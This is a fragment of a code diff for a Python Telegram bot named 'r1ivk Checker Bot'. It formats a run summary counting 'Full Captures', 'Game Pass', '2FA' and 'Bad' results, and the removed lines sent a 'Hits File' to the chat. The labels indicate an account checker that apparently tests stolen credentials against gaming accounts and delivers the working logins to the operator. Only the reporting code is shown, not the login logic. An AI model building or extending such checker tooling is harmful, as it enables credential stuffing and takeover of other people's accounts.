+        f"💎 Full Captures: {full_captures}\n"
+        f"🎮 Game Pass: {gamepass}\n"
+        f"🔐 2FA: {two_fa}\n"
+        f"❌ Bad: {bad}\n"
+        f"⏱️ Time Taken: {final_elapsed_str}"
+    )
     try:
-        bot.edit_message_text(final_msg, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
-    except:
-        bot.send_message(chat_id, final_msg, parse_mode="Markdown")
-
-    if hits > 0 and os.path.exists(output_filename):
-        with open(output_filename, 'rb') as f:
-            bot.send_document(chat_id, f, caption="📁 **Hits File**")
+        bot.edit_message_text(completion_text, chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
+    except Exception:
+        pass
 
 if __name__ == "__main__":
-    print("🚀 Bot is running...")
+    print("r1ivk Checker Bot is running (English UI)...")
     bot.infinity_polling()
